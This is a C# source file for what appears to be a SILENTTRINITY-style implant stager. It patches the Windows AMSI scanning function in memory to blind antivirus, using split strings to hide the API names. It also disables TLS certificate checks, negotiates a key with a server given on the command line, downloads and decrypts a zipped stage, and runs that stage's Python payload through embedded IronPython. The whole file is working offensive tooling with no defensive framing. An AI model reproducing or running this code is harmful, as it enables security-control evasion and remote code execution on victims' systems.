using System;
using System.Threading;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Net;
using System.Runtime.InteropServices;
using IronPython.Hosting;
using IronPython.Modules;
using Microsoft.Scripting.Hosting;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Collections.Generic;
//using Boo.Lang.Interpreter;
//using Boo.Lang.Compiler;
//using Boo.Lang.Compiler.IO;
//using Boo.Lang.Compiler.Pipelines;

namespace SILENTMOD
{
        public class main
        {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

        public static void Parchea(string Salsa)
        {


            {
                IntPtr TargetDLL = LoadLibrary(Salsa);
                if (TargetDLL == IntPtr.Zero)
                {
                    Console.WriteLine("[-] No se recibio la dll :(");
                    //return 1;
                }

                string Salseo = "Am" + "s" + "i";
                string Salseo2 = "S" + "can";
                string Salseo3 = "Bu" + "ffer";
                string Salseo_Final = Salseo + Salseo2 + Salseo3;
                IntPtr CabeshaOWned = GetProcAddress(TargetDLL, Salseo_Final);
                if (CabeshaOWned == IntPtr.Zero)
                {
                    Console.WriteLine("[-] No se recibio la funcion :(");
                    //return 1;
                }

                UIntPtr dwSize = (UIntPtr)5;
                uint Zero = 0;
                if (!VirtualProtect(CabeshaOWned, dwSize, 0x40, out Zero))
                {
                    Console.WriteLine("[-] No tiene permisos :(");
                    //return 1;
                }

                string Ketchup = "B8R57R00R07R80RC3";
                string[] XKetchup = Ketchup.Split('R');
                byte[] XMostaza = new byte[XKetchup.Length];
                for (int i = 0; i < XKetchup.Length; i++)
                {
                    XMostaza[i] = Convert.ToByte(XKetchup[i], 16);
                }

                Byte[] Parcheo = XMostaza;
                IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
                Marshal.Copy(Parcheo, 0, unmanagedPointer, 6);
                MoveMemory(CabeshaOWned, unmanagedPointer, 6);
                Console.WriteLine("[+] Parcheado Correctamente.");
            }


        }

        public static void lanza(string[] args)
        {
            
            string Salsa = "am" + "si" + ".dll";
            string checkdll = "c:\\Windows\\System32\\" + Salsa;
            if (System.IO.File.Exists(checkdll) == true) { main.Parchea(Salsa); }
            TRINITY.Main(args);
        }
        }

public class TRINITY
    {
        static Guid GUID = Guid.NewGuid();
        static Uri URL = null;
        static ZipArchive Stage = null;

        static TRINITY()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
        }

        public static dynamic CreateEngine()
        {
            ScriptRuntimeSetup setup = Python.CreateRuntimeSetup(GetRuntimeOptions());
            var pyRuntime = new ScriptRuntime(setup);
            ScriptEngine engineInstance = Python.GetEngine(pyRuntime);

            AddPythonLibrariesToSysMetaPath(engineInstance);

            return engineInstance;
        }
        private static IDictionary<string, object> GetRuntimeOptions()
        {
            var options = new Dictionary<string, object>();
            options["Debug"] = false;
            return options;
        }
        public static void AddPythonLibrariesToSysMetaPath(ScriptEngine engineInstance)
        {
            Assembly asm = Assembly.GetExecutingAssembly().GetType().Assembly;
            try
            {
                var resQuery =
                    from name in asm.GetManifestResourceNames()
                    where name.ToLowerInvariant().EndsWith(".zip")
                    select name;
                string resName = resQuery.Single();
#if DEBUG
                Console.WriteLine("Found embedded IPY stdlib : {0}", resName);
#endif
                var importer = new ResourceMetaPathImporter(asm, resName);
                dynamic sys = engineInstance.GetSysModule();
                sys.meta_path.append(importer);
                sys.path.append(importer);
                //List metaPath = sys.GetVariable("meta_path");
                //metaPath.Add(importer);
                //sys.SetVariable("meta_path", metaPath);
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine("Did not find IPY stdlib in embedded resources: {0}", e.Message);
#endif
                return;
            }
        }

        public static Byte[] GetResourceInZip(ZipArchive zip, string resourceName)
        {
            foreach (var entry in zip.Entries)
            {
                if (entry.Name == resourceName)
                {
#if DEBUG
                    Console.WriteLine("Found {0} in zip", resourceName);
#endif
                    using (var resource = entry.Open())
                    {
                        var resdata = new Byte[entry.Length];
                        resource.Read(resdata, 0, resdata.Length);
                        return resdata;
                    }
                }
            }
            throw new Exception(String.Format("{0} not in zip file", resourceName));
        }
        public static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Padding = PaddingMode.PKCS7;
                aesAlg.KeySize = 256;
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream decryptedData = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(decryptedData, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(data, 0, data.Length);
                        cryptoStream.FlushFinalBlock();
                        return decryptedData.ToArray();
                    }
                }
            }
        }
        public static byte[] AesEncrypt(byte[] data, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Padding = PaddingMode.PKCS7;
                aesAlg.KeySize = 256;
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform decryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream encryptedData = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(encryptedData, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(data, 0, data.Length);
                        cryptoStream.FlushFinalBlock();
                        return encryptedData.ToArray();
                    }
                }
            }
        }
        public static byte[] Encrypt(byte[] key, byte[] data)
        {
            IEnumerable<byte> blob = default(byte[]);

            using (RandomNumberGenerator rng = new RNGCryptoServiceProvider())
            {
                byte[] iv = new byte[16];
                rng.GetBytes(iv);

                byte[] encryptedData = AesEncrypt(data, key, iv);

                using (HMACSHA256 hmacsha256 = new HMACSHA256(key))
                {
                    byte[] ivEncData = iv.Concat(encryptedData).ToArray();
                    byte[] hmac = hmacsha256.ComputeHash(ivEncData);
                    blob = ivEncData.Concat(hmac);
                }
            }
            return blob.ToArray();
        }
        public static byte[] Decrypt(byte[] key, byte[] data)
        {
            byte[] decryptedData = default(byte[]);

            byte[] iv = new byte[16];
            byte[] ciphertext = new byte[(data.Length - 32) - 16];
            byte[] hmac = new byte[32];

            Array.Copy(data, iv, 16);
            Array.Copy(data, data.Length - 32, hmac, 0, 32);
            Array.Copy(data, 16, ciphertext, 0, (data.Length - 32) - 16);

            using (HMACSHA256 hmacsha256 = new HMACSHA256(key))
            {
                byte[] computedHash = hmacsha256.ComputeHash(iv.Concat(ciphertext).ToArray());
                for (int i = 0; i < hmac.Length; i++)
                {
                    if (computedHash[i] != hmac[i])
                    {
                        Console.WriteLine("Invalid HMAC: {0}", i);
                        return decryptedData;
                    }
                }
                decryptedData = AesDecrypt(ciphertext, key, iv);
            }
            return decryptedData;
        }
        public static byte[] HttpGet(Uri URL, string Endpoint = "")
        {
            Uri FullUrl = new Uri(URL, Endpoint);
#if DEBUG
            Console.WriteLine("Attempting HTTP GET to {0}", FullUrl);
#endif
            while (true)
            {
                try
                {
                    using (var wc = new WebClient())
                    {
                        byte[] data = wc.DownloadData(FullUrl);
#if DEBUG
                        Console.WriteLine("Downloaded {0} bytes", data.Length);
#endif
                        return data;
                    }
                }
                catch (Exception e)
                {
#if DEBUG
                    Console.WriteLine("Error downloading {0}: {1}", FullUrl, e.Message);
#endif
                    Thread.Sleep(5000);
                }
            }
        }
        public static byte[] HttpPost(Uri URL, string Endpoint = "", byte[] payload = default(byte[]))
        {
            Uri FullUrl = new Uri(URL, Endpoint);
#if DEBUG
            Console.WriteLine("Attempting HTTP POST to {0}", FullUrl);
#endif
            while (true)
            {
                try
                {
                    var wr = WebRequest.Create(FullUrl);
                    wr.Method = "POST";
                    if (payload.Length > 0)
                    {
                        wr.ContentType = "application/octet-stream";
                        wr.ContentLength = payload.Length;
                        var requestStream = wr.GetRequestStream();
                        requestStream.Write(payload, 0, payload.Length);
                        requestStream.Close();
                    }
                    var response = wr.GetResponse();
                    using (MemoryStream memstream = new MemoryStream())
                    {
                        response.GetResponseStream().CopyTo(memstream);
                        return memstream.ToArray();
                    }
                }
                catch (Exception e)
                {
#if DEBUG
                    Console.WriteLine("Error sending job results to {0}: {1}", FullUrl, e.Message);
#endif
                    Thread.Sleep(5000);
                }
            }
        }
        public static byte[] ECDHKeyExchange(Uri URL, string Endpoint = "")
        {
            byte[] key = default(byte[]);

            using (ECDiffieHellmanCng AsymAlgo = new ECDiffieHellmanCng())
            {
                var publicKey = AsymAlgo.PublicKey.ToXmlString();
                byte[] r = HttpPost(URL, Endpoint, Encoding.UTF8.GetBytes(publicKey));

                ECDiffieHellmanCngPublicKey peerPublicKey = ECDiffieHellmanCngPublicKey.FromXmlString(Encoding.UTF8.GetString(r));
                key = AsymAlgo.DeriveKeyMaterial(peerPublicKey);
            }
            return key;
        }
        private static Assembly MyResolveEventHandler(object sender, ResolveEventArgs args)
        {
            var bytes = default(byte[]);
            string DllName = args.Name + ".dll";

            if (args.Name.IndexOf(',') > 0)
            {
                DllName = args.Name.Substring(0, args.Name.IndexOf(',')) + ".dll";
            }

            if (Stage == null)
            {
#if DEBUG
                Console.WriteLine("Trying to resolve assemblies by staging zip");
#endif
                byte[] key = ECDHKeyExchange(URL);
                byte[] encrypted_zip = HttpGet(URL);
                Stage = new ZipArchive(new MemoryStream(Decrypt(key, encrypted_zip)));
            }

            try
            {
                bytes = GetResourceInZip(Stage, DllName);
            }
            catch
            {
                bytes = File.ReadAllBytes(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + DllName);
            }

            Assembly asm = Assembly.Load(bytes);
#if DEBUG
            Console.WriteLine("'{0}' loaded", asm.FullName);
#endif
            return asm;
        }
        public static void Main(string[] args)
        {
                  
            try
            {
                URL = new Uri(new Uri(args[0]), GUID.ToString());
            }
            catch { }
            Console.WriteLine(URL);
            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(MyResolveEventHandler);

            Console.WriteLine("URL: {0}", URL);
            Console.WriteLine();

            RunIPYEngine();

        }
        public static void RunIPYEngine()
        {
            var engine = CreateEngine();

            using (MemoryStream engineStream = new MemoryStream())
            {
                engine.Runtime.IO.SetOutput(engineStream, Encoding.UTF8);
                engine.Runtime.IO.SetErrorOutput(engineStream, Encoding.UTF8);

                if (Stage == null)
                {
                    byte[] key = ECDHKeyExchange(URL);
                    byte[] encrypted_zip = HttpGet(URL);
                    Stage = new ZipArchive(new MemoryStream(Decrypt(key, encrypted_zip)));
                }

                var scope = engine.CreateScope();
                scope.SetVariable("URL", URL);
                //scope.SetVariable("ST", new ST());
                scope.SetVariable("GUID", GUID);
                //scope.SetVariable("CHANNEL", "http");
                scope.SetVariable("IronPythonDLL", Assembly.Load(GetResourceInZip(Stage, "IronPython.dll")));

#if DEBUG
                scope.SetVariable("DEBUG", true);
#elif RELEASE
            scope.SetVariable("DEBUG", false);
#endif

                byte[] mainPyFile = GetResourceInZip(Stage, "Main.py");
                engine.Execute(Encoding.UTF8.GetString(mainPyFile, 0, mainPyFile.Length), scope);

#if DEBUG
                if (engineStream.Length > 0)
                {
                    Console.WriteLine(engineStream.ToString());
                }
#endif

            }

        }

}

}